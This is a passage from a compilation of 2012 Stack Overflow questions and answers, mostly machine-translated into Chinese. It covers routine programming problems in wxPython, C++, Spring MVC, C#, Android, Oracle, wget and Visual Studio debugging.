    dc = wx.ClientDC(self.imageCtrl)
    dc.SetPen(wx.Pen(wx.BLUE, 2))
    dc.DrawLines(((223, 376), (223, 39), (240, 39), (240,376), (223,376))) 
```

当前的 PaintDC 不会进入无限循环，而是将图像放置在 staticBitmap 中，并且以某种方式绘图位于图像后面。因此，当我调整大小时，ComboBoxes 会擦除图像的一部分，并调整窗口大小以覆盖图像，从而擦除该部分。当我调整窗口大小时，绘图仍然存在，但图像已被删除。这是我所拥有的：

```
 self.imageCtrl = wx.StaticBitmap(self.thePanel, wx.ID_ANY, 
                                     wx.EmptyBitmap(517,524))

def OnGoSelect(self,e):
    print "GO"
    img = wx.Image("./poster/"+self.picChoice,wx.BITMAP_TYPE_PNG) 
    self.imageCtrl.SetBitmap(wx.BitmapFromImage(img))

    self.imageCtrl.Bind(wx.EVT_PAINT, self.OnPaint)

def OnPaint(self, e):
    print "OnPaint Triggered"
    dc = wx.PaintDC(self.imageCtrl)
    dc.Clear()
    dc.SetPen(wx.RED_PEN)
    dc.DrawLines(((100, 200), (100, 100), (200, 100), (200,200), (100,200))) 
```

对于 MemoryDC，我自己加载了一个 EmptyBitmap，在其上绘制，然后尝试将其放入 staticBitmap。它给了我一个空白的灰色屏幕。如果我没有在 EmptyBitmap 上绘图，它会显示为正常的黑色。即使我在它上面画了，我也把它保存到一个文件中，它应该以它应该的方式出现，但仍然给我应用程序内部的灰色屏幕。这是 MemoryDC 代码：

```
 self.imageCtrl = wx.StaticBitmap(self.thePanel, wx.ID_ANY, 
                                     wx.EmptyBitmap(517,524))

def Draw(self, e):
    print "Draw" 
    img = wx.Image("./poster/Test2.png", wx.BITMAP_TYPE_ANY)
    bit = wx.EmptyBitmap(517,524)
    dc = wx.MemoryDC(bit)
    dc.SetBackground(wx.Brush(wx.BLACK))
    dc.Clear()
    dc.SetPen(wx.Pen(wx.RED, 1))
    dc.DrawLines(((83, 375), (83, 42), (120, 42), (120,375), (83,375)))
    self.imageCtrl.SetBitmap(bit)  
    bit.SaveFile("bit.bmp", wx.BITMAP_TYPE_BMP) 
```

我无计可施。欢迎任何建议！

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-08-03T16:11:47.227

我找到了！

之前我不知道在使用 MemoryDC 时，我必须取消选择我正在绘制的位图。这是通过将 wx.NullBitmap 传递给 SelectObject 方法来完成的。

这是 MemoryDC 的代码：

```
def Draw(self, e):
    print "Draw" 
    img = wx.Image("./poster/Test2.png", wx.BITMAP_TYPE_ANY)
    bit = wx.EmptyBitmap(517,524)
    imgBit = wx.BitmapFromImage(img)
    dc = wx.MemoryDC(imgBit)
    dc.SetPen(wx.Pen(wx.RED, 1))
    dc.DrawLines(((83, 375), (83, 42), (120, 42), (120,375), (83,375)))
    dc.SelectObject(wx.NullBitmap)# I didn't know I had to deselect the DC
    self.imageCtrl.SetBitmap(imgBit)  
    imgBit.SaveFile("bit.bmp", wx.BITMAP_TYPE_BMP) 
```

# c++ - 不同整数类型之间的区别

> ID：11786113
> 
> 赞同：26
> 
> 时间：2012-08-02T21:32:27.030
> 
> 标签：c++, c

我想知道 和 之间有什么区别`uint32_t`，`uint32`当我查看头文件时，它有：

```
types.h:

    /** @brief 32-bit unsigned integer. */
    typedef unsigned int uint32;
stdint.h:

    typedef unsigned   uint32_t; 
```

这只会引出更多问题：两者有什么区别？

```
unsigned varName; 
```

和

```
unsigned int varName; 
```

?

我在用`MinGW.`

* * *

## 回答 #1

> 赞同：22
> 
> 时间：2012-08-02T21:38:36.437

`unsigned`and`unsigned int`是同义词，很像`unsigned short [int]`and `unsigned long [int]`。

`uint32_t`是由 C 标准（可选）定义的类型。`uint32`只是你编的一个名字，虽然它恰好被定义为同一个东西。

* * *

## 回答 #2

> 赞同：5
> 
> 时间：2012-08-02T21:35:31.400

没有区别。

`unsigned int = uint32 = uint32_t = unsigned`在你的情况下，`unsigned int = unsigned`总是

* * *

## 回答 #3

> 赞同：3
> 
> 时间：2012-08-02T21:40:14.980

`unsigned` and `unsigned int` are synonymous for historical reasons; they both mean "unsigned integer of the most natural size for the CPU architecture/platform", which is often (but by no means always) 32 bits on modern platforms.

`<stdint.h>` is a standard header in C99 that is supposed to give type definitions for integers of particular sizes, with the `uint32_t` naming convention.

The `<types.h>` that you're looking at appears to be non-standard and presumably belongs to some framework your project is using. Its `uint32` typedef is compatible with `uint32_t`. Whether you should use one or the other in your code is a question for your manager.

* * *

## 回答 #4

> 赞同：2
> 
> 时间：2012-08-02T21:35:24.013

`unsigned`和之间绝对没有区别`unsigned int`。

但是，该类型是否适合匹配`uint32_t`取决于实现；an`int`可能比 32 位“更短”。

# java - 根目录上的spring mvc网站（“/”）

> ID：11786115
> 
> 赞同：7
> 
> 时间：2012-08-02T21:32:36.107
> 
> 标签：java, servlets, spring-mvc, mapping

我想将 spring mvc 控制器映射到 root ( `/**`) 路径（而不是子文件夹，例如“/something”），同时使用`mvc:resources`（打开另一种方法）进行异常。

这应该是该框架的基础知识，但显然是一个非常复杂的问题。

我`app-servlet.xml`有这些明显的映射异常：

```
<mvc:resources mapping="/favicon.ico" location="/favicon.ico" />
<mvc:resources mapping="/robots.txt" location="/robots.txt" /> 
```

我有这个控制器：

```
import java.util.Date;

import javax.servlet.http.HttpServletRequest;

import org.springframework.stereotype.Controller;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.RequestMethod;

@Controller
@RequestMapping("/**")
public class MainController {

    @RequestMapping(method = RequestMethod.GET)
    public String service(final HttpServletRequest request) {
        final String servlet_path = request.getServletPath();
        System.out.println(String.format("%s %s", new Date().toString(), servlet_path));
        return "test";
    }
} 
```

现在，当我点击“/”或“/test”或“/test/page”时，我会得到如下输出：

```
Fri Aug 03 00:22:12 IDT 2012 /
Fri Aug 03 00:22:13 IDT 2012 /favicon.ico 
```

.. 看？即使它被明确排除`service()`，也被要求！`/favicon.ico`

现在我猜对 XML 有一些“优先级” `@Controller`，但是，我如何使排除工作？

一个简单的要求 - 将网站放在“/”上。

PS[这个答案](https://stackoverflow.com/a/4556267/286260)回答了一个非常相似的问题。

另一个注意事项：这个问题与tomcat上下文无关。

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2012-10-22T21:07:27.897

我想澄清一下，不是重写`<mvc:annotation-driven/>`一个可以更改处理程序指令的声明顺序：

```
<mvc:resources mapping="/favicon.ico" location="/favicon.ico" order="0"/>
<mvc:resources mapping="/robots.txt" location="/robots.txt" order="0"/>
<mvc:annotation-driven/> 
```

* * *

## 回答 #2

> 赞同：7
> 
> 时间：2012-08-02T22:13:23.197

这里的问题是，与注册的 HandlerMapping 相比，注册的底层[HandlerMapping](http://static.springsource.org/spring/docs/3.1.x/javadoc-api/org/springframework/web/servlet/HandlerMapping.html)`<mvc:resources`的优先级非常低`<mvc:annotation-driven/>`。如果您的要求只是让某些东西响应“/”，那么更好的方法可能是使用不同的@RequestMapping，`/**`而不是说拥有它`/home`并按照以下方式定义一些东西：

`<mvc:view-controller path="/" view-name="home" />`

如果这不起作用，唯一的其他选择是降低底层 handlerMapping 的优先级`<mvc:resources`，这可以通过显式定义 HandlerMapping 来完成 - 有点复杂但可以完成。

**更新** 这里是一个可能的配置：

先试试这个：

```
<mvc:resources mapping="/favicon.ico" location="/favicon.ico" order="0"/>
<mvc:resources mapping="/robots.txt" location="/robots.txt" order="0"/> 
```

如果仅此一项不起作用，`<mvc:annotation-driven/>`请在 Spring 3.1.x 中更改为以下内容：

```
<bean name="handlerAdapter" class="org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerAdapter">
    <property name="webBindingInitializer">
        <bean class="org.springframework.web.bind.support.ConfigurableWebBindingInitializer">
            <property name="conversionService" ref="conversionService"></property>
            <property name="validator">
                <bean class="org.springframework.validation.beanvalidation.LocalValidatorFactoryBean">
                    <property name="providerClass" value="org.hibernate.validator.HibernateValidator"></property>
                </bean>
            </property>
        </bean>
    </property>
    <property name="messageConverters">
        <list>
            <bean class="org.springframework.http.converter.ByteArrayHttpMessageConverter"></bean>
            <bean class="org.springframework.http.converter.StringHttpMessageConverter"></bean>
            <bean class="org.springframework.http.converter.ResourceHttpMessageConverter"></bean>
            <bean class="org.springframework.http.converter.xml.SourceHttpMessageConverter"></bean>
            <bean class="org.springframework.http.converter.xml.XmlAwareFormHttpMessageConverter"></bean>
            <bean class="org.springframework.http.converter.xml.Jaxb2RootElementHttpMessageConverter"></bean>
            <bean class="org.springframework.http.converter.json.MappingJacksonHttpMessageConverter"></bean>
        </list>
    </property>
</bean>

<bean name="handlerMapping" class="org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping">
    <property name="order" value="2"></property>
</bean> 
```

# c# - 我的 MDI 启动不正确

> ID：11786120
> 
> 赞同：-1
> 
> 时间：2012-08-02T21:33:14.017
> 
> 标签：c#, winforms, mdi

我的 C# MDI 应用程序从 program.cs 开始，如下所示：

```
namespace APRSTW
{
    static class Program
    {
        public static Form parentForm;
        /// <summary>
        /// The main entry point for the application.
        /// </summary>
        [STAThread]
        static void Main()
        {
            Application.EnableVisualStyles();
            Application.SetCompatibleTextRenderingDefault(false);
            parentForm = new MainAPRSTW();//<-so I can reference this form as a parent in other .cs files.
            Application.Run(parentForm);
        }
    }
} 
```

for 的构造函数`MainAPRSTW`如下所示：

```
public MainAPRSTW()
{
    frmSplash objfrmSplash = new frmSplash();
    objfrmSplash.ShowDialog();

    //windows init
    InitializeComponent();

    //Initialize the program
    InitProgram();

}//close main 
```

我已经发布了一个 PNG 屏幕截图，显示了程序在以下位置运行时会发生什么

[http://www.Blandranch.net/Files/Capture.PNG（.net](http://www.Blandranch.net/Files/Capture.PNG)之后的情况很重要）

您会看到子窗体的轮廓，并且孔是文本框和组。我从来没有看到父表格。

我究竟做错了什么？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-03T11:39:20.357

我认为显示启动画面是问题所在。如果您告诉应用程序您从 1 个表单开始，那么您不能在显示第一个表单之前跳转到另一个表单。您可能应该做的是从 Application.Run 显示您的启动屏幕，然后让您的启动屏幕显示您的 MDI 表单。

# android - 如何在应用程序的最开始显示（模态）对话框？

> ID：11786123
> 
> 赞同：0
> 
> 时间：2012-08-02T21:33:38.230
> 
> 标签：android, modal-dialog, android-activity, android-alertdialog

在我的 Android 应用程序开始时，用户需要从替代列表中进行选择。这就是为什么。

假设我有一长串项目，每个项目都属于一个类别。每个用户只对一个特定类别感兴趣。因此，当应用程序启动并且 SharedPreferences 不包含有关所选类别的任何信息时，应该显示一个模式对话框 - 在这里用户必须选择他或她感兴趣的类别。选择类别后，仅显示该类别的项目。

到目前为止，我尝试在 Activity 的 onCreate() 方法中实现这种行为，这显然不起作用。该对话框未显示或至少没有足够长以便我可以看到它。

老实说，我没想到代码可以通过从`onCreate()`. 但是，我无法在`Activity`可以触发对话框的地方找到合适的事件处理程序。

**为了确保选择一个类别（在加载任何其他数据之前），应该从哪里触发这个对话框？**

提前致谢。

这是代码：

```
public void onCreate(Bundle savedInstanceState) {
    super.onCreate(savedInstanceState);
    ...
    setContentView(R.layout.activity_item_list);
    ...
    ensureCategorySelected();
} 
```

相关方法在哪里

```
private void ensureCategorySelected() {
    String chosenCategory = getCategoryFromSharedPreferences();

    if (chosenCategory != null) {
        final CharSequence[] items = getCategories();

        AlertDialog.Builder builder = new AlertDialog.Builder(this);
        builder.setTitle("Choose category");
        builder.setItems(items, new DialogInterface.OnClickListener() {
            public void onClick(DialogInterface dialog, int item) {
                // handle the selection of the category
            }
        });
        AlertDialog alert = builder.show();
    }
} 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-02T21:39:21.383

你有一个逻辑问题。您希望在仍然没有保存首选项时显示对话框，并且在保存首选项时显示它。将其更改为`chosenCategory == null`，它应该可以工作。

为什么你没想到代码可以工作`onCreate()`？我没有看到在那里打开对话框的问题。

编辑：我不太确定 onCreate() 是否是*显示*对话框的正确位置。尝试`ensureCategorySelected()`使用 onStart() 而不是 onCreate()。

您还可以考虑为此实施一项活动，您可以从`startActivityForResult()`.

# android - ListItem 单击和复选框同时单击

> ID：11786124
> 
> 赞同：0
> 
> 时间：2012-08-02T21:33:46.837
> 
> 标签：android, listview

我一直在尝试使用列表项做很多事情，但遇到了一些问题。在[我之前的问题](https://stackoverflow.com/questions/11712978/android-extending-checkedtextview-source-code)中，感谢@nEx.Software 我能够解决问题。但是我在这里仍然缺少一些概念。

现在我正在尝试区分项目的点击和其中的复选框。但是，我想在不扩展阵列适配器的情况下做到这一点。有没有办法同时使用这两种方法：listView.onItemClickListener() 和 listView.getCheckedItemPositions()！

应该有一种方法可以使用 xml 文件 [不管它变得多么复杂] 以及扩展可用的视图，并且应该完成这件事。

简单地说，打开 gmail 应用程序，您会找到所有带有复选框的电子邮件，您可以单击复选框将其标记或单击项目的其余部分以打开电子邮件。同样，我知道扩展适配器并为复选框添加一个数组是可行的，但是，是否可以使用方便的方法：listView.onItemClickListener() 和 listView.getCheckedItemPositions()？CheckedTextView 是解决方案的一部分吗？

还有一件事，而不仅仅是回答我[我变得懒惰]无论是否可能，对于此类问题是否有非常可靠的参考？我真的很想完全理解这件事的所有内容......如果不可能，我必须能够说出原因！

谢谢 ：）

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-02T21:38:23.910

将自定义行添加到您的列表视图中。在您的自定义行中，您将一个文本视图和复选框添加到 linerlayout 并获得 linerlayout 点击事件。

# java - Oracle 下划线：Linux 上的 JDBC 查询结果顺序与 MAC-OS 或 Windows 上的结果不同

> ID：11786131
> 
> 赞同：1
> 
> 时间：2012-08-02T21:34:27.260
> 
> 标签：java, oracle, jdbc, collation

我有一个包含两列的表：

**ID**     **描述**
1 第一行
2 第二行
3 _
4 1 第一个数字行

我有一个疑问

```
SELECT * FROM TABLE ORDER BY DESCRIPTION 
```

问题是我根据运行代码的机器检索不同的结果。如果我运行代码

*   linux (centos) 我得到以下结果
    **ID**      **描述**
    4 1 第一个数字行
    3 _
    1 第一行
    2 第二行

*   windows (7) 我得到以下结果
    **ID**      **描述**
    3 _
    1 第一行
    2 第二行
    4 1 第一个数字行

*   MAC OS(Snow Leopard) 我得到以下结果
    **ID**      **描述**
    3 _
    1 第一行
    2 第二行
    4 1 第一个数字行

因此，您可以看到下划线“_”的处理方式因我运行查询的机器而异:(。
这是驱动程序的问题吗？为什么我没有得到相同的结果？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-03T08:09:59.267

10 倍的提示。确实问题出在**locale**的设置上，我有：

*   在 Linux 上

    `LANG=en_US.UTF-8`

    `LC_CTYPE="en_US.UTF-8"`

*   在 Mac 上

    `LANG=de_DE.UTF-8`

    `LC_CTYPE="de_DE.UTF-8"`

在德语 utf-8 上的 linux 机器上设置**语言环境**后，我在 linux 上的结果与在另一台机器（mac 和 windows）上的结果相同，现在构建恢复稳定:)。

我将尝试使用 NLS_LANG 的配置，以便能够将 linux 机器的**语言环境设置**回英语 utf-8。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2016-09-22T10:49:47.460

顺序取决于您的 NLS 设置。 [请参阅 NLS_LANG 和 NLS_SORT 设置](https://docs.oracle.com/cd/B19306_01/server.102/b14225/ch3globenv.htm)。如果您在所有环境中提供相同的 NLS 设置，则顺序将相同。

您还可以明确指定顺序：

```
SELECT * 
  FROM TABLE 
 ORDER BY NLSSORT(Description, 'NLS_SORT = BINARY') 
```

我预计排序的性能在这里并不重要，因为如果列被索引，查询可能不会使用描述列上的索引。

# google-chrome - 是否可以在谷歌浏览器中播放 m3u8 视频？

> ID：11786132
> 
> 赞同：3
> 
> 时间：2012-08-02T21:34:41.977
> 
> 标签：google-chrome, windows-7, html5-video

有没有办法通过扩展/破解/或其他方式从谷歌浏览器播放 m3u8 视频？我在获得有关 m3u8 支持的官方消息时遇到了一些麻烦，尽管我很确定它不受支持。

我正在开发一个具有实时播放功能的视频播放器（使用 Flash 用于标准浏览器应用程序），所以我使用 m3u8 来让所有东西都在移动设备上运行，但是移动设备上的调试工具还有很多不足之处。我想知道是否有任何解决方法可以让这些视频正常工作，以便我可以使用浏览器调试器。（我在 Windows 7 上）。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-04T22:35:47.593

规范中有一个新的[appendBytes/sourceBuffer 提案](http://dvcs.w3.org/hg/html-media/raw-file/tip/media-source/media-source.html#source-buffer-model)，我看到一个 chrome 布道者提到在 chrome canary 中有一个 beta 实现。有了它，您将不得不编写大量的 javascript 来读取 m3u8 文件、获取视频片段、解析数据并手动将它们推送到媒体元素中。我猜这比你想做的测试要多。

您可能想要的是类似[Weinre](http://people.apache.org/~pmuellr/weinre/docs/latest/)的东西。

# android - Android从原始文件夹的mp3设置铃声（呼叫，通知，警报）

> ID：11786134
> 
> 赞同：1
> 
> 时间：2012-08-02T21:34:53.340
> 
> 标签：android, audio, notifications, alarm, ringtone

我想`mp3`从我的`raw`文件夹中设置一个到`ringtone, notification and alarm`，我有一个开关和这句话：

```
public void onClick(DialogInterface dialog, int item) {
                Uri path = Uri.parse("android.resource://com.genaut.instantbuttonsfreak/raw/"+sonidoActual);
                switch(item){
                case 0:
                    RingtoneManager.setActualDefaultRingtoneUri(getApplicationContext(), RingtoneManager.TYPE_RINGTONE, path);
                    //RingtoneManager.getRingtone(getApplicationContext(), path).play();
                    Log.d("RutaTONO", RingtoneManager.getActualDefaultRingtoneUri(getApplicationContext(), RingtoneManager.TYPE_RINGTONE).toString());
                    break;
                case 1:
                    RingtoneManager.setActualDefaultRingtoneUri(getApplicationContext(), RingtoneManager.TYPE_NOTIFICATION, path);
                    break;
                case 2:
                    RingtoneManager.setActualDefaultRingtoneUri(getApplicationContext(), RingtoneManager.TYPE_ALARM, path);
                    break;
                }
            } 
```

好吧，在`case 0`，第一行将声音设置为默认呼叫铃声，第二行播放声音，第三行显示带有 uri 的日志，这一切都很好，或者我认为。

问题是当我的手机被呼叫、通知或“报警”时，声音不会播放。对不起我的英语不好。

我有这个`uses-permissions`：

```
<uses-permission android:name="android.permission.WRITE_SETTINGS" />
<uses-permission android:name="android.permission.CHANGE_CONFIGURATION" />
<uses-permission android:name="android.permission.MOUNT_UNMOUNT_FILESYSTEMS" />
<uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE" />
<uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE" /> 
```

我总是改变这个，声音是我的手机默认声音：S

# wget - 为什么wget不递归获取java文件？

> ID：11786135
> 
> 赞同：1
> 
> 时间：2012-08-02T21:34:59.617
> 
> 标签：wget

我正在尝试使用 wget 下载网站中文件夹下的所有文件夹结构和文件。

假设有一个网站，例如：

```
http://test/root. Under root it is like

/A

    /A1/file1.java

/B

    /B1/file2.html 
```

我的 wget cmd 是：

```
wget -r http://test/root/ 
```

我得到了所有文件夹和 html 文件，但没有 java 文件。这是为什么？

更新1：

我可以使用以下方法在浏览器中访问该文件：

```
http://test/root/A/A1/file1.java 
```

我也可以使用以下方法下载这个单独的文件：

```
wget http://test/root/A/A1/file1.java 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-02T21:36:25.680

`wget`可以按照*链接*。

如果没有指向子目录中文件的*链接*，则 wget 将*找不到*这些文件。`wget`不会*猜测*任何文件名，不会详尽地测试文件名，`wget`也不会练习黑魔法。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2021-09-02T05:02:55.837

仅仅因为您可以在浏览器中访问文件并不意味着`wget`一定可以检索它。您的浏览器具有能够识别目录结构的代码，`wget`只知道您告诉它什么。

您可以先尝试将 java 文件添加到`accept`列表中，也许这就是它所需要的：

```
wget -r -A "*.java" http://text/root 
```

但听起来您正试图获得该站点的完整离线镜像。让我们开始——就像我们试图弄清楚的任何命令一样——使用`man wget`：

> Wget 可以**跟踪**HTML、XHTML 和 CSS 页面中的链接，**创建远程网站的本地版本**，完全重建原始站点的目录结构。这有时被称为**“递归下载”。**在这样做的同时，**Wget 尊重机器人排除标准 (/robots.txt)。**可以**指示 Wget 将下载文件中的链接转换为指向本地文件，以便离线查看。**

# 我们需要的

## 1\. 要下载的文件的正确链接。

在您的`intex.html`文件中，您必须提供指向 Java 文件的链接，否则`wget`将无法识别为需要下载。对于您当前的目录结构，确保`file2.html`包含指向 java 文件的链接。将其格式化为链接到当前目录之上的目录：

```
<a href="../test/root/A/A1/file1.java">JavaFile</a> 
```

但是，如果`file1.java`不敏感并且您经常这样做，则将`index.html`文件放在`root`目录中并链接到以下内容会更简洁且代码更少：

```
<a href="/A/A1/file1.java">JavaFile</a> 
```

如果你**只**想要 Java 文件并想忽略 HTML，你可以`--reject`像这样使用：

```
wget  -r -nH --reject="file2.html"
### Or to reject ALL html files ###
wget -r -nH --reject="*.html" 
```

这将递归地 ( `-r`) 从我们指定的点开始遍历所有目录。

## 2\. 尊重`robots.txt`

确保如果您的目录`/robots.txt`中有文件，`*/root/*`它不会阻止爬网。如果是这样，您需要`wget`使用命令中的以下选项`wget`通过添加来指示忽略它：

```
wget ... -e robots=off http://test/root 
```

## 3\. 将远程链接转换为本地文件。

此外，`wget`必须**指示**将链接转换为下载的文件。如果您已正确完成上述所有操作，那么您应该没问题。我发现获取所有文件的最简单方法是使用`mirror`命令，前提是在非公共目录后面没有隐藏任何内容。

### 尝试这个：

```
wget -mpEk http://text/root/

# If robots.txt is present:

wget -mpEk robots=off http://text/root/ 
```

首选使用`-m`代替，`-r`因为它没有最大递归深度并且它会下载所有资产。Mirror 非常擅长确定站点的完整深度，但是如果您有许多外部链接，您最终可能会下载的不仅仅是您的站点，这就是我们使用`-p -E -k`. 制作页面的所有先决条件文件和保留的目录结构应该是输出。`-k`将链接转换为本地文件。由于您应该设置一个链接，因此您应该`file1.java`在`../A1/`目录中获得一个。但是，此命令应该按原样工作，而无需将特定链接放置到您的`index.html`或内部的 java 文件中，`file2.html`但它不会受到伤害，因为它保留了目录的其余部分。镜像模式也适用于设置为`ftp://`还。

### 一般经验法则：

根据您正在做镜像的站点的一侧，您正在向服务器发送许多调用。为了防止您被列入黑名单或被切断，请使用该`wait`选项来限制您的下载。如果它是您发布的站点一侧的站点，则不必这样做，但是您要镜像的任何大型站点都需要使用它：

```
wget -mpEk --no-parent robots=off --random-wait http://text/root/ 
```

# javascript - 如何在 ClEditor 中插入表格插件

> ID：11786144
> 
> 赞同：1
> 
> 时间：2012-08-02T21:35:34.397
> 
> 标签：javascript, jquery, wysiwyg, cleditor

我有

```
<script src="cledtor.js"></script
<script src="cledtortable.js"></script 
```

然后在我的html中我有

```
 $(document).ready(function() {           

                 $("#editor-content").cleditor({
                        width: 708,
                        height: 350,
                        controls:
                            "bold italic underline strikethrough | alignleft center alignright justify | size " +
                                "| color removeformat | outdent indent | bullets numbering rule | image link unlink | undo redo | pastetext ",
                        colors:
                            "000000 898989 db0000 005e20 06758c ",

                        sizes:
                            "1,2,3,4,5,6,7",

                        useCSS: false,
                        docType:
                            '<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">',
                        docCSSFile: 
                            "",
                        bodyStyle: 
                            "margin:4px; font:10pt Arial,Verdana; cursor:text"
                    });
    }); 
```

如果我添加“表格”控件，它不起作用。作为这段代码，仍然没有表格图标..我在buttons.gif所在的同一个地方得到了table.gif图像

[官方 ClEditor 页面](http://premiumsoftware.net/cleditor/)

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-01-09T01:55:27.143

1：将js文件上传到与cleditor js文件相同的目录并包含在您的js包含中（如您所示）

2：上传table.gif到images目录

3：将“表格”添加到您的控件行中（不带引号）

应该像任何其他插件一样出现:-)

# c# - Visual Studio 2010 中的条件断点不必是布尔值吗？

> ID：11786146
> 
> 赞同：0
> 
> 时间：2012-08-02T21:35:41.347
> 
> 标签：c#, visual-studio-debugging, breakpoints, conditional-breakpoint

我不明白 Visual Studio 中条件断点的“条件”意味着什么。也许有人可以解释以下行为？

设置条件断点时（在弹出窗口中选择“为真”），我希望它的行为方式与“if”语句中的表达式相同。

例如：

```
 int x = 1;
    // (1) Breakpoint with expression "x == 1" returns True and the debugger stops here
    // (2) Breakpoint with expression "x != 1" returns False and the debugger does not stop here
    // (3) Breakpoint with expression "x = 42" returns ?? and the debugger stops here (!!) and executes the assignment(!!) 
```

案例（3）显然是一个错字。如果我将表达式 (3) 放在“if”语句中

```
 if (x = 42) { /* ... */ } 
```

代码无法编译。

(3) 中的错字可能很危险。我[在 GitHub 上放置了一个简单的演示来](https://github.com/draptik/vs_debugger_conditional_demo)演示这个问题。

在阅读[有关该主题的 MSDN 文档时，](http://msdn.microsoft.com/en-us/library/bb340500.aspx)这不应该发生，对吧？

感谢任何指示。

更新：[来自 GitHub 的代码](https://github.com/draptik/vs_debugger_conditional_demo/blob/master/ConsoleApplication1/Program.cs)

```
 using System;
    using System.Collections.Generic;
    using System.Linq;

    namespace ConsoleApplication1
    {
        /// <summary>
        /// Simple program showing that Visual Studio's conditional breakpoints do not have to return boolean results.
        /// 
        /// Tested with:
        /// - Visual Studio 2005
        /// - Visual Studio 2010
        /// </summary>
        public class Program
        {
            static void Main(string[] args)
            {
                var userService = new UserService();

                var userJon = new User {Id = 1, Name = "Jon Doe"};
                userService.SaveOrUpdateUser(userJon);

                var userSally = new User { Id = 2, Name = "Sally Sample" };
                userService.SaveOrUpdateUser(userSally);

                foreach (var user in userService.Users) {

                    // IMPORTANT: Add a conditional breakpoint on the next line with 'user.id = 1' (instead of 'user.id == 1' or 'user.id.Equals(1)'). See doc folder for screenshots.
                    int id = user.Id;

                    // ...some logic...

                    user.Id = id;

                    // ...some more logic...

                    userService.SaveOrUpdateUser(user);
                }

                // Show results of what just happened on command line
                Console.WriteLine("\n\nRESULTS==================================");
                foreach (var user in userService.Users) {
                    Console.WriteLine("User Id: " + user.Id);
                    Console.WriteLine("User Name: " + user.Name);
                }
                Console.WriteLine("\n\nEND RESULTS==================================");

                // Add a 'normal' breakpoint on the next line to read the console output
            }

        }

        internal class UserService
        {
            public UserService()
            {
                Users = new List<User>();
            }

            public List<User> Users { get; private set; }

            /// <summary>
            /// Imagine this method doing a database insert or update!
            /// </summary>
            public void SaveOrUpdateUser(User user)
            {
                Console.WriteLine("\tSaveOrUpdateUser...");
                Console.WriteLine("\tUser Id: " + user.Id);
                Console.WriteLine("\tUser Name: " + user.Name);

                User userAlreadyPresent = Users.FirstOrDefault(u => u.Name.Equals(user.Name)); // dummy find method

                if (userAlreadyPresent == null) {
                    Console.WriteLine("Adding new user");

                    Users.Add(user);    
                }
                else {
                    Console.WriteLine("\nUPDATING USER.......................");
                    Console.WriteLine("\tOld infos about user:");
                    Console.WriteLine("\tUser id: " + userAlreadyPresent.Id);
                    Console.WriteLine("\tUser name: " + userAlreadyPresent.Name);
                    Console.WriteLine("\tNew infos about user:");
                    Console.WriteLine("\tUser id: " + user.Id);
                    Console.WriteLine("\tUser name: " + user.Name);

                    userAlreadyPresent.Id = user.Id;
                }
            }
        }

        internal class User
        {
            public int Id { get; set; }
            public string Name { get; set; }
        }
    } 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-09T18:22:12.733

调试器用于调试程序。这些程序可以用任意数量的语言编写。F#、C#、VB、Assembly、C++、C 等。每种语言都有不同的语义，因为它能够评估表达式是否为真。调试器实际上并没有为特定语言做任何非常具体的事情（事实上，可能甚至不知道它获得断点的特定代码是用任何特定语言编写的）。它真的只知道事物在内存中的位置，以及它们代表什么。

长话短说，在评估条件断点的表达式时，它不遵守 C# 语法。

# c# - 在 C# 中检查一个字符串是否与多个子字符串组合

> ID：11786147
> 
> 赞同：1
> 
> 时间：2012-08-02T21:35:42.627
> 
> 标签：c#

可以说我有几个短字符串：

`string[] shortStrings = new string[] {"xxx","yyy","zzz"};` （这个定义也可以改变数组和字符串的长度，所以不是固定的）

当给定字符串时，我想检查它是否仅与 shortStrings 结合，如何？

假设功能就像`bool TestStringFromShortStrings(string s)`

然后

```
TestStringFromShortStrings("xxxyyyzzz") = true;
TestStringFromShortStrings("xxxyyyxxx") = true;
TestStringFromShortStrings("xxxyyy") = true;
TestStringFromShortStrings("xxxxxx") = true;
TestStringFromShortStrings("xxxxx") = false;
TestStringFromShortStrings("xxxXyyyzzz") = false;
TestStringFromShortStrings("xxx2yyyxxx") = false; 
```

请推荐一种记忆力不紧张且速度较快的方法。

**[EIDT] 这个函数有什么用？**

我个人会用这个函数来测试一个字符串是否是拼音的组合[ok](http://en.wikipedia.org/wiki/Pinyin)，一些中文的东西。如果您看不懂中文，则跟随中文是一回事。

检测一个字符串是否为汉语拼音（例如检测是否拼音域名） 所有的汉语拼音有：</p>

（检测一个字符串是否是拼音字符串的汉语拼音（例如检测音域）：）

```
